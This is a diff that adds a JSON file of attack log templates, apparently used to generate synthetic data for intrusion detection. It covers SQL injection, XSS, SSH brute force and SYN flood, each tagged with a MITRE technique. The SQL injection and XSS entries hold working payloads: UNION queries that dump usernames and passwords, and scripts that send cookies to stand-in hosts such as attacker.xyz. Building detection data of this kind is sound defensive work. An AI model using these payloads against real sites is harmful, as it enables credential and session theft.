@@ -1,0 +1,80 @@
+{
+  "attacks": [
+    {
+      "type": "SQL Injection",
+      "source": "Apache-HTTP",
+      "port": 80,
+      "protocol": "TCP",
+      "templates": [
+        "GET /login.php?user=admin%27+OR+%271%27=%271 HTTP/1.1 200 4522 Mozilla/5.0",
+        "POST /api/v1/search?query=%27+UNION+SELECT+null,username,password+FROM+users-- HTTP/1.1 500 128 Mozilla/5.0",
+        "GET /products.php?id=-1+UNION+ALL+SELECT+1,2,CONCAT_WS(0x3a,table_name,column_name)+FROM+information_schema.columns-- HTTP/1.1 200 8943 Mozilla/5.0"
+      ],
+      "mitre_hint": "T1190",
+      "flow_features": {
+        "dest_port": 80,
+        "flow_duration": 450,
+        "total_fwd_packets": 6,
+        "flow_bytes_per_sec": 1280.0,
+        "syn_flag_count": 1
+      }
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "source": "Apache-HTTP",
+      "port": 443,
+      "protocol": "TCP",
+      "templates": [
+        "GET /comment.php?msg=%3Cscript%3Edocument.location=%27http://attacker.xyz/steal?c=%27+document.cookie%3C/script%3E HTTP/1.1 200 1204 Mozilla/5.0",
+        "POST /guestbook?author=%3Cimg+src=x+onerror=alert(1)%3E HTTP/1.1 200 3410 Mozilla/5.0",
+        "GET /search?q=%3Csvg/onload=fetch(%27//eval.evil.com/%27+btoa(document.cookie))%3E HTTP/1.1 200 2311 Mozilla/5.0"
+      ],
+      "mitre_hint": "T1189",
+      "flow_features": {
+        "dest_port": 443,
+        "flow_duration": 320,
+        "total_fwd_packets": 5,
+        "flow_bytes_per_sec": 980.0,
+        "syn_flag_count": 1
+      }
+    },
+    {
+      "type": "SSH Brute Force",
+      "source": "SSH-Auth",
+      "port": 22,
+      "protocol": "TCP",
+      "templates": [
+        "sshd[18421]: Failed password for invalid user root from {src_ip} port {src_port} ssh2",
+        "sshd[18424]: Failed password for root from {src_ip} port {src_port} ssh2",
+        "sshd[18428]: Failed password for invalid user admin from {src_ip} port {src_port} ssh2",
+        "sshd[18432]: Maximum authentication attempts exceeded for root from {src_ip} port {src_port} ssh2 [preauth]"
+      ],
+      "mitre_hint": "T1110.001",
+      "flow_features": {
+        "dest_port": 22,
+        "flow_duration": 85,
+        "total_fwd_packets": 18,
+        "flow_bytes_per_sec": 4200.0,
+        "syn_flag_count": 4
+      }
+    },
+    {
+      "type": "DDoS / SYN Flood",
+      "source": "CIC-IDS2017",
+      "port": 80,
+      "protocol": "TCP",
+      "templates": [
+        "SYN_FLOOD: Packet rate anomaly detected on interface eth0: 142,500 pkts/sec from {src_ip}",
+        "FLOW_ALERT: High volume embryonic TCP connections target 192.168.1.100:80 from distributed pool"
+      ],
+      "mitre_hint": "T1498.001",
+      "flow_features": {
+        "dest_port": 80,
+        "flow_duration": 15,
+        "total_fwd_packets": 1250,
+        "flow_bytes_per_sec": 890000.0,
+        "syn_flag_count": 1250
+      }
+    }
+  ]
+}
